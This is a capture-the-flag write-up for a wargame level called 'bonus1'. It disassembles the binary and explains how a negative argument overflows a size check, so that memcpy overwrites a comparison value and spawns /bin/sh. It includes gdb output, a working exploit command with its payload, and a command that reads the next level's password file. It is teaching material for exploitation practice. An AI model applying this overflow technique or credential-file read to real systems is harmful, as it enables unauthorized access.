New bonus, same method. `radare2` is our friend for this file:

```bash
[0x08048370]> pdf @ sub.main_8048424
            ;-- main:
            ; ICOD XREF from sub.entry0_8048370 @ 0x8048387(r)
┌ 129: sub.main_8048424 (int32_t arg_ch);
│ `- args(sp[0x8..0x8]) vars(4:sp[0x8..0x40])
│           0x08048424      55             push ebp
│           0x08048425      89e5           mov ebp, esp
│           0x08048427      83e4f0         and esp, 0xfffffff0
│           0x0804842a      83ec40         sub esp, 0x40
│           0x0804842d      8b450c         mov eax, dword [arg_ch]
│           0x08048430      83c004         add eax, 4
│           0x08048433      8b00           mov eax, dword [eax]
│           0x08048435      890424         mov dword [esp], eax
│           0x08048438      e823ffffff     call sym.imp.atoi
│           0x0804843d      8944243c       mov dword [var_3ch], eax
│           0x08048441      837c243c09     cmp dword [var_3ch], 9
│       ┌─< 0x08048446      7e07           jle 0x804844f
│       │   0x08048448      b801000000     mov eax, 1
│      ┌──< 0x0804844d      eb54           jmp 0x80484a3
│      ││   ; CODE XREF from sub.main_8048424 @ 0x8048446(x)
│      │└─> 0x0804844f      8b44243c       mov eax, dword [var_3ch]
│      │    0x08048453      8d0c850000..   lea ecx, [eax*4]
│      │    0x0804845a      8b450c         mov eax, dword [arg_ch]
│      │    0x0804845d      83c008         add eax, 8
│      │    0x08048460      8b00           mov eax, dword [eax]
│      │    0x08048462      89c2           mov edx, eax
│      │    0x08048464      8d442414       lea eax, [var_14h]
│      │    0x08048468      894c2408       mov dword [var_8h], ecx
│      │    0x0804846c      89542404       mov dword [var_4h], edx
│      │    0x08048470      890424         mov dword [esp], eax
│      │    0x08048473      e8a8feffff     call sym.imp.memcpy
│      │    0x08048478      817c243c46..   cmp dword [var_3ch], 0x574f4c46 ; 'FLOW'
│      │┌─< 0x08048480      751c           jne 0x804849e
│      ││   0x08048482      c744240800..   mov dword [var_8h], 0
│      ││   0x0804848a      c744240480..   mov dword [var_4h], 0x8048580 ; [0x8048580:4]=0x2f006873 ; "sh"
│      ││   0x08048492      c704248385..   mov dword [esp], str._bin_sh ; [0x8048583:4]=0x6e69622f ; "/bin/sh"
│      ││   0x08048499      e8b2feffff     call sym.imp.execl
│      ││   ; CODE XREF from sub.main_8048424 @ 0x8048480(x)
│      │└─> 0x0804849e      b800000000     mov eax, 0
│      │    ; CODE XREF from sub.main_8048424 @ 0x804844d(x)
│      └──> 0x080484a3      c9             leave
└           0x080484a4      c3             ret
```

Our goal here is to **reach the part** of the main that**executes the `/bin/sh`**

The program first does `nb = atoi(av[1])`, then a **comparison to check that nb <= 9**.
Next, there's a call to `memcpy(av[2], nb * 4)`, and finally a last comparison:

```bash
0x08048478 <+84>: cmpl $0x574f4c46, 0x3c(%esp)
```

Our goal will be to give it a large enough number so that `memcpy()` copies `0x574f4c46` to `0x3c(%esp)`:

```bash
Starting program: /home/user/bonus1/bonus1 4 $(python -c 'print "A" * 16')
Breakpoint 1, 0x08048478 in main ()
(gdb) x/20wx $esp
0xbffff6d0:	0xbffff6e4	0xbffff8fa	0x00000010	0x080482fd
0xbffff6e0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff700:	0xb7fed280	0x00000000	0x080484b9	0x00000004
0xbffff710:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
(gdb) x/wx $esp+0x3c
0xbffff70c:	0x00000004
```

During the comparison step, we see our 16 "A"s being copied, and the **compared address is at offset 44 (40 bytes + address)**.

So, the program needs to **copy 44 bytes**, but our **maximum input** value in the first argument is **9**.

In memory, the first bit is called the **sign bit**: it is `0` if the number is positive or zero, and `1` if negative.

Multiplying by 4 in binary is equivalent to shifting left by 2 bits.  
Example: `1 = 0001 * 4 = 0100 = 4`

We want to write 11 (because 44 / 4 = 11), and the number 11 in 32-bit binary is:  
`0000 0000 0000 0000 0000 0000 0000 1011`

So 11 \* 4 becomes:  
`0000 0000 0000 0000 0000 0000 0010 1100` → which equals 44

The smallest negative number, `int min`, is:  
`1000 0000 0000 0000 0000 0000 0000 0000`  
_(reminder: the first bit is the sign bit)_

Knowing all this, multiplying a negative number close to `int min` by 4 will cause the sign bit to shift out.

Example:

```bash
1000 0000 0000 0000 0000 0000 0000 0000
OR
1100 0000 0000 0000 0000 0000 0000 0000
```

We just need to "add" 11 to one of those values:  
`1100 0000 0000 0000 0000 0000 0000 1011` → which equals `-1073741813`

This number passes the `atoi` check since it's less than 9.  
Then, when multiplied by 4 in binary, it gives:  
`0000 0000 0000 0000 0000 0000 0010 1100` → which is 44

So now we just need to copy our 40 bytes + `0x574f4c46` (the value for the comparison):

```bash
./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

Finally, the execve(/bin/sh) is triggered, and we can just run:

```bash
cat /home/user/bonus2/.pass
```

And get the second bonus flag !
